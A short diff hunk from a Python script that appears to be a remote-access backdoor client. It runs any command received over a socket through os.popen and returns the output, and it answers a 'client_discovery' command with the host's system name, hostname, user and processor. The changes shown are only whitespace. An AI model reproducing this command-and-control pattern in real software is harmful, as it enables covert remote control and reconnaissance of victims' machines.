@@ -71,13 +71,13 @@ def main():
         # client_discovery
         elif cmd == 'client_discovery':
             results = '{}|{}|{}|{}|{}'.format(platform.system(),
-            platform.node(),getpass.getuser(),platform.release(),
-            platform.processor())
+                platform.node(),getpass.getuser(),platform.release(),
+                platform.processor())
             s.sendall(encode(results))
         # any other command
         else:
             results = os.popen(cmd).read()
             s.sendall(encode(results))
-
+            
 if __name__ == '__main__':
     main()
